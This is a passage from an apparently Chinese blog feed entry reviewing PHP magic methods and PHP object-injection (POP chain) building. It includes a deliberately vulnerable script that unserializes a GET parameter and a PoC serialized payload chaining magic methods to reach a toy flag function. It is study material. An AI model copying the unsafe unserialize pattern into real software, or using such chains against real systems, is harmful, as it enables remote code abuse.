class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> $uname;<br>    <span class="hljs-keyword">private</span> $passwd;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$uname,$passwd</span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;uname = $uname;<br>        <span class="hljs-keyword">$this</span>-&gt;passwd = $passwd;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;调用构造函数\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;销毁时调用\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params">$property, $value</span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;$property = $value;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;uname;<br>    &#125;<br>&#125;<br><br>$t = <span class="hljs-keyword">new</span> Test(<span class="hljs-string">&quot;lcdm123&quot;</span>, <span class="hljs-string">&quot;passwd&quot;</span>);<br>$t-&gt;show();<br>$t-&gt;uname = <span class="hljs-string">&quot;test&quot;</span>;<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>$t-&gt;show();<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211020235111821.png" alt="image-20211020235111821"></p><h3 id="get"><a href="#get" class="headerlink" title="__get()"></a>__get()</h3><p>用来获取私有成员属性值，有一个参数，参数传入你要获取的成员属性的名称，返回获取的属性值。</p><blockquote><p>用来在类外获取私有变量</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> $uname;<br>    <span class="hljs-keyword">private</span> $passwd;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$uname,$passwd</span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;uname = $uname;<br>        <span class="hljs-keyword">$this</span>-&gt;passwd = $passwd;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;调用构造函数\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;销毁时调用\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params">$property, $value</span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;$property = $value;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params">$name</span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;$name;<br>    &#125;<br>&#125;<br><br>$t = <span class="hljs-keyword">new</span> Test(<span class="hljs-string">&quot;lcdm123&quot;</span>, <span class="hljs-string">&quot;passwd&quot;</span>);<br><span class="hljs-keyword">echo</span> $t-&gt;uname;<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>$t-&gt;uname = <span class="hljs-string">&quot;test&quot;</span>;<br><span class="hljs-keyword">echo</span> $t-&gt;uname;<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="D:\markdown\image-20211020235505059.png" alt="image-20211020235505059"></p><h3 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h3><p>如果你试着调用一个对象中不存在或被权限控制中的方法，它就会被自动调用</p><p><img src="D:\markdown\image-20211021183145903.png" alt="image-20211021183145903"></p><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><p>把类当成字符串使用时自动调用</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211021211818736.png" alt="image-20211021211818736"></p><h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h3><p>将类当成函数方法时调用</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211021212227538.png" alt="image-20211021212227538"></p><h3 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h3><p>定义这个魔术方法方便我们在类外测试类中是否定义了某个私有变量</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211021214354276.png" alt="image-20211021214354276"></p><h3 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h3><p>销毁一个类的私有变量，当销毁一个不存在的属性时也会自动调用 <code>__unset()</code> 函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211021231856031.png" alt="image-20211021231856031"></p><h3 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a>__callStatic()</h3><p>当创建一个静态方法以调用该类中不存在的一个方法时使用此函数，与 <code>__call()</code> 相同</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211021232730554.png" alt="image-20211021232730554"></p><h2 id="POP链构造测试"><a href="#POP链构造测试" class="headerlink" title="POP链构造测试"></a>POP链构造测试</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211023222416562.png" alt="image-20211023222416562"></p><p>构造简单的 POP 链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">start_gg</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $mod1;<br>        <span class="hljs-keyword">public</span> $mod2;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test1();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Call</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $mod1;<br>        <span class="hljs-keyword">public</span> $mod2;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test1</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test2();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CallFunc</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $mod1;<br>        <span class="hljs-keyword">public</span> $mod2;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params">$test2,$arr</span>)</span><br><span class="hljs-function">        </span>&#123;<br>                $s1 = <span class="hljs-keyword">$this</span>-&gt;mod1;<br>                $s1();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InvokeFunc</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $mod1;<br>        <span class="hljs-keyword">public</span> $mod2;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod2 = <span class="hljs-string">&quot;字符串拼接&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;mod1;<br>        &#125; <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ToStringFunc</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $str1;<br>        <span class="hljs-keyword">public</span> $str2;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;str1-&gt;get_flag();<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag:&quot;</span>.<span class="hljs-string">&quot;flag&#123;Success&#125;&quot;</span>;<br>        &#125;<br>&#125;<br>$a = $_GET[<span class="hljs-string">&#x27;string&#x27;</span>];<br>unserialize($a);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">start_gg</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $mod1;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> CallFunc();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CallFunc</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $mod1;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;mod1 =<span class="hljs-keyword">new</span> InvokeFunc();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InvokeFunc</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $mod1 ;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> ToStringFunc();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ToStringFunc</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $str1 ;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;str1 = <span class="hljs-keyword">new</span> GetFlag();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag:&quot;</span>.<span class="hljs-string">&quot;flag&#123;test&#125;&quot;</span>;<br>        &#125;<br>&#125;<br>$a = <span class="hljs-keyword">new</span> start_gg();<br><span class="hljs-keyword">echo</span> serialize($a);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//     O:8:&quot;start_gg&quot;:1:&#123;s:4:&quot;mod1&quot;;O:8:&quot;CallFunc&quot;:1:&#123;s:4:&quot;mod1&quot;;O:10:&quot;InvokeFunc&quot;:1:&#123;s:4:&quot;mod1&quot;;O:12:&quot;ToStringFunc&quot;:1:&#123;s:4:&quot;str1&quot;;O:7:&quot;GetFlag&quot;:0:&#123;&#125;&#125;&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>这里我直接倒着分析的首先我们想要调用<code>get_flag()</code>方法获取到结果就需要执行<code>__toString()</code> 方法，这里看到可以利用 <code>InvokeFunc</code> 类中的 <code>__invoke()</code> 方法，就需要调用 <code>CallFunc</code> 类中的 <code>__call()</code> 方法，就需要使用 <code>star_gg</code> 类中的析构函数。这样一条链子就可以 </p><p><code>start_gg-&gt;__destruct()  --&gt; CallFunc-&gt;__call() --&gt;InvokeFunc-&gt;__invoke()  --&gt; ToStringFunc-&gt;__toString() --&gt; GetFlag-&gt;get_flag()</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211023225653694.png" alt="image-20211023225653694"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>熟练使用这些函数有助于后面我们可以更快捷的构建出反序列化 POP 链，如果还有遗漏的后期补上。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PHP序列化复习&quot;&gt;&lt;a href=&quot;#PHP序列化复习&quot; class=&quot;headerlink&quot; title=&quot;PHP序列化复习&quot;&gt;&lt;/a&gt;PHP序列化复习&lt;/h1&gt;&lt;p&gt;之前学的不是那么牢靠，所以这里来复习一下&lt;/p&gt;
&lt;h2 id=&quot;常用魔术方法&quot;&gt;&lt;a hr</summary>
      
    
    
    
    <category term="编程语言" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
</feed>
